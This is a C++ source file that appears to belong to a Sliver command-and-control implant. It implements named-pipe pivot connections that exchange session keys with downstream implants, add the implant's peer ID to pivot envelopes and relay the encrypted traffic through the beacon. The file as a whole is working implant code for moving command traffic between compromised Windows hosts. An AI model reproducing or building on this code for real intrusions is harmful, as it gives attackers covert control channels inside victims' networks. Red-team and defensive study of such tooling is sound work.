#include "PivotConn.h"
#include "CryptoUtils.h"
#include <thread>
#include <future>
#include "constants.h"
#include "pivots.h"
#include "concurrent_queue.h"
#include "Beacon.h"
#define BUF_SIZE 32768
using namespace std;
using namespace transports;


extern string instanceID;

namespace pivots {
	PivotConn::PivotConn() {
		stop = false;
	}
	PivotConn::~PivotConn() {
		if (t.joinable())
			t.join();
	}
	void NamedPipeConn::Start() {
		std::thread t1{
			[&] {
				while (1) {
					if (stop) {
						DisconnectNamedPipe(this->hRead);
						DisconnectNamedPipe(this->hWrite);
						CloseHandle(this->hRead);
						CloseHandle(this->hWrite);
						return;
					}
					try {
						auto env = ReadEnvelope();
						if (env.type() == sliverpb::MsgPivotPeerEnvelope || env.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
							sliverpb::PivotPeerEnvelope peer_env;
							peer_env.ParseFromString(env.data());
							auto peers = peer_env.peers();
							for (auto it = peers.begin();it != peers.end();++it) {
								auto a = it->peerid();
							}
							auto p = peer_env.add_peers();
							auto temp = instanceID;
							temp.resize(8);
							p->set_name(temp);
							p->set_peerid(pivots::getPeerID());
							for (auto it = peers.begin();it != peers.end();++it) {
								auto a = it->peerid();
							}
							string serialized;
							peer_env.SerializeToString(&serialized);
							env.set_data(serialized);
							sliverpb::Envelope resp;
							if (env.type() == sliverpb::MsgPivotPeerEnvelope) {
								if (beacon->BeaconRecv(env, resp)) {
									WriteEnvelope(resp);
								}
								else {
									throw exception("BeaconRecv returned false");
								}
							}
							else if (env.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
								if(!beacon->BeaconSend(env))
									throw exception("BeaconSend returned false");
							}
						}
					}
					catch (exception &e) {
						cout << std::format("NamedPipe Conn catched exception: {}", e.what())<< endl;
						stop = true;
					}
				}
			} 
		};
		this->t = std::move(t1);
		/*std::thread t2{
			[&] {
				while (1) {
					sliverpb::Envelope env;
					if (downstream->try_pop(env)) {
						WriteEnvelope(env);
					}
				}
			}
		};
		t2.detach();*/
	}

	void NamedPipeConn::Stop() {
		this->stop = true;
		if(t.joinable())
			this->t.join();
	}
	NamedPipeConn::NamedPipeConn(HANDLE _hRead,HANDLE _hWrite) : hRead(_hRead), hWrite(_hWrite) {
		this->downstream = make_shared<concurrency::concurrent_queue<sliverpb::Envelope>>();
	}
	sliverpb::Envelope NamedPipeConn::ReadEnvelope() {
		auto data = read();
		auto plain = ctx.Decrypt(data);
		sliverpb::Envelope env;
		env.ParseFromString(plain);
		return env;
	}
	bool NamedPipeConn::Check() {
		DWORD available = 0;
		PeekNamedPipe(this->hRead, NULL, 0, NULL, &available, NULL);
		if (available > 4) {
			return true;
		}
		else {
			return false;
		}
	}
	bool NamedPipeConn::WriteEnvelope(const sliverpb::Envelope& env) {
		string serialized;
		env.SerializeToString(&serialized);
		auto enc = this->ctx.Encrypt(serialized);
		return this->write(enc);
	}
	string NamedPipeConn::read() {
		DWORD n = 0;
		DWORD read = 0;
		BOOL res = false;
		res = ReadFile(this->hRead, &n, sizeof n, &read, NULL);
		if (!res) {
			throw exception(std::format("ReadFile returned error {}", GetLastError()).c_str());
		}
		string out;
		out.resize(n);
		char* ptr = (char*)out.c_str();
		read = 0;
		while (read < n) {
			if (n - read > BUF_SIZE) {
				DWORD read_bytes = 0;
				res = ReadFile(this->hRead, (LPVOID)ptr, BUF_SIZE, &read_bytes, NULL);
				if (!res) {
					throw exception(std::format("ReadFile returned error {}", GetLastError()).c_str());
				}
				ptr += read_bytes;
				read += read_bytes;
			}
			else {
				DWORD read_bytes = 0;
				res = ReadFile(this->hRead, (LPVOID)ptr, n-read, &read_bytes, NULL);
				if (!res) {
					throw exception(std::format("ReadFile returned error {}", GetLastError()).c_str());
				}
				ptr += read_bytes;
				read += read_bytes;
			}
		}
		return out;
		/*char buf[2048] = { 0 };
		DWORD read_bytes = 0;
		string out;
		out.resize(0);
		while (1) {
			DWORD message_bytes = 0;
			PeekNamedPipe(this->h, NULL, NULL, NULL, NULL, &message_bytes);
			if (message_bytes) {
				auto res = ReadFile(this->h, &buf, 2048, &read_bytes, NULL);
				if (res) {
					out.append(buf, read_bytes);
					break;
				}
				if (!res && GetLastError() == ERROR_MORE_DATA) {
					out.append(buf, read_bytes);
				}
			}
		}
		return out;*/
		/*char buf[2048] = { 0 };
		DWORD read_bytes = 0;
		string out;
		out.resize(0);
		while (1) {
			auto res = ReadFile(this->hRead, &buf, 2048, &read_bytes, NULL);
			if (res) {
				out.append(buf, read_bytes);
				break;
			}
			if (!res && GetLastError() == ERROR_MORE_DATA) {
				out.append(buf, read_bytes);
			}
		}
		return out;*/
	}
	bool NamedPipeConn::write(const string& in) {
		auto size = static_cast<uint32_t>(in.size());
		DWORD written = 0;
		BOOL res = false;
		res = WriteFile(this->hWrite, &size, sizeof uint32_t, &written, NULL);
		if (!res) {
			throw exception(std::format("WriteFile returned error {}", GetLastError()).c_str());
		}
		DWORD tot_written = 0;
		auto buff_ptr = (char*)in.c_str();
		while (tot_written < size) {
			if (size - tot_written > BUF_SIZE) {
				res = WriteFile(this->hWrite, buff_ptr, BUF_SIZE,&written,NULL);
				if (!res) {
					throw exception(std::format("WriteFile returned error {}", GetLastError()).c_str());
				}
				tot_written += written;
				buff_ptr += written;
			}
			else {
				res = WriteFile(this->hWrite, buff_ptr, size - tot_written, &written, NULL);
				if (!res) {
					throw exception(std::format("WriteFile returned error {}", GetLastError()).c_str());
				}
				tot_written += written;
				buff_ptr += written;
			}
		}
		return true;
		//DWORD written = 0;
		//auto hEvent = CreateEvent(
		//	NULL,    // default security attribute 
		//	TRUE,    // manual-reset event 
		//	TRUE,    // initial state = signaled 
		//	NULL);
		//OVERLAPPED ov;
		//ov.hEvent = hEvent;
		//ov.Offset = 0;
		//ov.OffsetHigh = 0;
		//WriteFile(this->h, in.c_str(), in.size(),&written, &ov);
		//if (WaitForSingleObject(hEvent, 1000)== WAIT_OBJECT_0) {
		//	return true;
		//}
		//return false;

		/*DWORD written = 0;
		if (WriteFile(this->hWrite, in.c_str(), in.size(), &written, NULL))
			return true;
		else
			return false;*/
	}
	bool NamedPipeConn::peerKeyExchange() {
		auto s = this->read();
		sliverpb::PivotHello hello;
		hello.ParseFromString(s);
		this->downstreamPeerID = hello.peerid();
		auto key = crypto::RandomKey();
		this->ctx.SetKey(key);
		sliverpb::PivotHello resp;
		resp.set_sessionkey(key);
		string serialized_resp;
		resp.SerializeToString(&serialized_resp);
		this->write(serialized_resp);
		return true;
	}
}